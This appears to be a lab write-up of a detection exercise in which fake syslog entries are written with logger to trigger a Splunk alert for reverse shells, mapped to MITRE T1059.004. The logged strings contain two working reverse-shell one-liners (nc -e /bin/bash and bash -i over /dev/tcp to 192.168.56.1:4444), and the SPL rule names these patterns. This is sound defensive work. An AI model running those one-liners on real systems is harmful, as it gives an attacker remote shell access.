# Attack Simulation 5: Reverse Shell Indicators

## Objective
Simulate log evidence of a reverse shell connection attempt,
a common post-exploitation technique.

## Attack Machine
Ubuntu Splunk Server (internal)

## Attack Commands
```bash
logger "Suspicious command executed: nc -e /bin/bash 192.168.56.1 4444"
logger "Suspicious activity: bash -i >& /dev/tcp/192.168.56.1/4444 0>&1"
```

## MITRE ATT&CK Mapping
- Technique: T1059.004 - Unix Shell
- Tactic: Execution

## Detection Rule Triggered
- Alert: Reverse Shell Indicators
- SPL: search "nc -e" OR "bash -i" OR "/dev/tcp"
- Status: TRIGGERED

## Result
CONFIRMED - Reverse shell command patterns detected in syslog
